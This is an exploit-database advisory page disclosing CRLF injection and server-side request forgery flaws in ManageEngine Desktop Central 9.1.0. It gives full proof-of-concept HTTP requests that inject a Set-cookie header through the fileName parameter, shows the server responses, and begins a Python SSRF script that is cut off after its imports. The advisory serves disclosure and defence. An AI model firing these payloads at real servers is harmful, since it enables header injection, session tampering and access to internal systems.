---
title: Desktop Central 9.1.0 CRLF Injection / Server-Side Request Forgery
url: https://cxsecurity.com/issue/WLB-2023030052
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-03-28
fetch_date: 2025-10-04T10:49:47.596218
---

# Desktop Central 9.1.0 CRLF Injection / Server-Side Request Forgery

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Desktop Central 9.1.0 CRLF Injection / Server-Side Request Forgery** **2023.03.27**  Credit:  **[Rafael Pedrero](https://cxsecurity.com/author/Rafael%2BPedrero/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-93](https://cxsecurity.com/cwe/CWE-93 "Click to see CWE-93")  [CWE-918](https://cxsecurity.com/cwe/CWE-918 "Click to see CWE-918")** | |

# Exploit Title: Desktop Central 9.1.0 - Multiple Vulnerabilities
# Discovery by: Rafael Pedrero
# Discovery Date: 2021-02-14
# Software Link : http://www.desktopcentral.com
# Tested Version: 9.1.0 (Build No: 91084)
# Tested on: Windows 10
# Vulnerability Type: CRLF injection (CRLF) - 1
CVSS v3: 6.1
CVSS vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
CWE: CWE-93
Vulnerability description: CRLF injection vulnerability in ManageEngine
Desktop Central 9.1.0 allows remote attackers to inject arbitrary HTTP
headers and conduct HTTP response splitting attacks via the fileName
parameter in a /STATE\_ID/1613157927228/InvSWMetering.csv.
Proof of concept:
GET
https://localhost/STATE\_ID/1613157927228/InvSWMetering.csv?toolID=2191&=&toolID=2191&fileName=any%0D%0ASet-cookie%3A+Tamper%3Df0f0739c-0499-430a-9cf4-97dae55fc013&isExport=true
HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86\_64; rv:85.0) Gecko/20100101
Firefox/85.0
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,\*/\*;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
DNT: 1
Connection: keep-alive
Referer:
https://localhost/invSWMetering.do?actionToCall=swMetering&toolID=2191&selectedTreeElem=softwareMetering
Upgrade-Insecure-Requests: 1
Content-Length: 0
Cookie: DCJSESSIONID=0B20DEF653941DAF5748931B67972CDB; buildNum=91084;
STATE\_COOKIE=%26InvSWMetering%2FID%2F394%2F\_D\_RP%2FtoolID%253D2191%2526%2F\_PL%2F25%2F\_FI%2F1%2F\_TI%2F0%2F\_SO%2FA%2F\_PN%2F1%2F\_TL%2F0%26\_REQS%2F\_RVID%2FInvSWMetering%2F\_TIME%2F1613157927228;
showRefMsg=false; summarypage=false;
DCJSESSIONIDSSO=8406759788DDF2FF6D034B0A54998D44; dc\_customerid=1;
JSESSIONID=0B20DEF653941DAF5748931B67972CDB;
JSESSIONID.b062f6aa=vi313syfqd0c6r7bgwvy85u; screenResolution=1280x1024
Host: localhost
Response:
HTTP/1.1 200 OK
Date:
Server: Apache
Pragma: public
Cache-Control: max-age=0
Expires: Wed, 31 Dec 1969 16:00:00 PST
SET-COOKIE: JSESSIONID=0B20DEF653941DAF5748931B67972CDB; Path=/; HttpOnly;
Secure
Set-Cookie: buildNum=91084; Path=/
Set-Cookie: showRefMsg=false; Path=/
Set-Cookie: summarypage=false; Path=/
Set-Cookie: dc\_customerid=1; Path=/
Set-Cookie: JSESSIONID=0B20DEF653941DAF5748931B67972CDB; Path=/
Set-Cookie: JSESSIONID.b062f6aa=vi313syfqd0c6r7bgwvy85u; Path=/
Set-Cookie: screenResolution=1280x1024; Path=/
Content-Disposition: attachment; filename=any
Set-cookie: Tamper=f0f0739c-0499-430a-9cf4-97dae55fc013.csv
X-dc-header: yes
Content-Length: 95
Keep-Alive: timeout=5, max=20
Connection: Keep-Alive
Content-Type: text/csv;charset=UTF-8
# Vulnerability Type: CRLF injection (CRLF) - 2
CVSS v3: 6.1
CVSS vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
CWE: CWE-93
Vulnerability description: CRLF injection vulnerability in ManageEngine
Desktop Central 9.1.0 allows remote attackers to inject arbitrary HTTP
headers and conduct HTTP response splitting attacks via the fileName
parameter in a /STATE\_ID/1613157927228/InvSWMetering.pdf.
Proof of concept:
GET
https://localhost/STATE\_ID/1613157927228/InvSWMetering.pdf?toolID=2191&=&toolID=2191&fileName=any%0D%0ASet-cookie%3A+Tamper%3Df0f0739c-0499-430a-9cf4-97dae55fc013&isExport=true
HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86\_64; rv:85.0) Gecko/20100101
Firefox/85.0
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,\*/\*;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
DNT: 1
Connection: keep-alive
Referer:
https://localhost/invSWMetering.do?actionToCall=swMetering&toolID=2191&selectedTreeElem=softwareMetering
Upgrade-Insecure-Requests: 1
Content-Length: 0
Cookie: DCJSESSIONID=0B20DEF653941DAF5748931B67972CDB; buildNum=91084;
STATE\_COOKIE=%26InvSWMetering%2FID%2F394%2F\_D\_RP%2FtoolID%253D2191%2526%2F\_PL%2F25%2F\_FI%2F1%2F\_TI%2F0%2F\_SO%2FA%2F\_PN%2F1%2F\_TL%2F0%26\_REQS%2F\_RVID%2FInvSWMetering%2F\_TIME%2F1613157927228;
showRefMsg=false; summarypage=false;
DCJSESSIONIDSSO=8406759788DDF2FF6D034B0A54998D44; dc\_customerid=1;
JSESSIONID=0B20DEF653941DAF5748931B67972CDB;
JSESSIONID.b062f6aa=vi313syfqd0c6r7bgwvy85u; screenResolution=1280x1024
Host: localhost
HTTP/1.1 200 OK
Date:
Server: Apache
Pragma: public
Cache-Control: max-age=0
Expires: Wed, 31 Dec 1969 16:00:00 PST
SET-COOKIE: JSESSIONID=0B20DEF653941DAF5748931B67972CDB; Path=/; HttpOnly;
Secure
Set-Cookie: buildNum=91084; Path=/
Set-Cookie: showRefMsg=false; Path=/
Set-Cookie: summarypage=false; Path=/
Set-Cookie: dc\_customerid=1; Path=/
Set-Cookie: JSESSIONID=0B20DEF653941DAF5748931B67972CDB; Path=/
Set-Cookie: JSESSIONID.b062f6aa=vi313syfqd0c6r7bgwvy85u; Path=/
Set-Cookie: screenResolution=1280x1024; Path=/
Content-Disposition: attachment; filename=any
Set-cookie: Tamper=f0f0739c-0499-430a-9cf4-97dae55fc013
X-dc-header: yes
Content-Length: 4470
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: application/pdf;charset=UTF-8
# Vulnerability Type: Server-Side Request Forgery (SSRF)
CVSS v3: 8.0
CVSS vector: CVSS:3.0/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H
CWE: CWE-918 Server-Side Request Forgery (SSRF)
Vulnerability description: Server-Side Request Forgery (SSRF) vulnerability
in ManageEngine Desktop Central 9.1.0 allows an attacker can force a
vulnerable server to trigger malicious requests to third-party servers or
to internal resources. This vulnerability allows authenticated attacker
with network access via HTTP and can then be leveraged to launch specific
attacks such as a cross-site port attack, service enumeration, and various
other attacks.
Proof of concept:
Save this content in a python file (ex. ssrf\_manageenginedesktop9.py),
change the variable sitevuln value with ip address:
import argparse
from termcolor import colored
import requests
import urllib3
import datetime
ur...